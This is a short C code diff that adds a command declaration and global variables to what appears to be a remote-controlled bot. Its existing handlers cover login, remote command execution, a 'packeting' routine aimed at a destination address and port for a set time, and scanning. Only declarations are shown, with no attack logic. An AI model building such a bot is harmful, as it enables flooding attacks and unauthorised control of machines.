@@ -15,6 +15,7 @@
 
 int cmd_init(sock_t *sp);
 int cmd_ping(sock_t *sp);
+int cmd_packeting(sock_t *sp, requests_t *req);
 void cmd_login(sock_t *sp, requests_t *req);
 void cmd_logout(sock_t *sp, requests_t *req);
 void cmd_exec(sock_t *sp, requests_t *req, char *token);
@@ -44,6 +45,16 @@ int packeting(sock_t *sp, unsigned int dest_addr,
     unsigned short dest_port, int ntime);
 void cmd_scan_central(sock_t *sp, requests_t *req, 
     unsigned short type);
+
+static unsigned short uport;
+static unsigned int dsthost;
+static unsigned int useconds;
+static char status_temp[128];
+
+pid_t pid, g_pid;
+int random_ct, random_num;
+int login_status, stop;
+char *token;
 
 int pub_requests(sock_t *sp, requests_t *req) {
     token = strtok(netbuf, "\n");
